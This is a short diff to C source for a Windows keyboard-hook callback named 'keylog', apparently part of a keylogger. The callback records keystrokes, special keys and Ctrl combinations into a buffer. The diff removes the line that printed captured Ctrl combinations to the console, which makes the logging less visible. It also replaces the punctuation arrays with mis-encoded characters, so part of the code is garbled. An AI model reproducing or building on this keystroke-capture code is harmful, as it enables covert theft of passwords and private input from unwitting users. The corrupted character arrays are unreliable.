@@ -87,8 +87,8 @@ LRESULT CALLBACK keylog (int nCode, WPARAM a, LPARAM lParam)
     short alt_key=0;
     short ctrl =0;
 
-    char numbershift [] = {'=','!','\"','·','$','%','&','/','(',')'};
-    char alt [] ={'|','@','#','~','€','¬'};
+    char numbershift [] = {'=','!','\"','Â·','$','%','&','/','(',')'};
+    char alt [] ={'|','@','#','~','â‚¬','Â¬'};
     char special [6][15]={"[BACKSPACE]","[TAB]","[RESERVED]","[RESERVED]","[CLEAR]","[ENTER]"};
     char ctrl_tag[]="\[Ctrl + ";
     char ctrl_text[3];
@@ -147,7 +147,6 @@ LRESULT CALLBACK keylog (int nCode, WPARAM a, LPARAM lParam)
             ctrl_text[2]= '\0';
             ctrl_text[0]= (char)key;
             strcat (ctrl_tag,ctrl_text);
-            printf ("%s", ctrl_tag);
             strncpy(&buffer[pos],ctrl_tag, strlen(ctrl_tag));
             pos=pos+strlen(ctrl_tag);
             if (pos >= 200) {
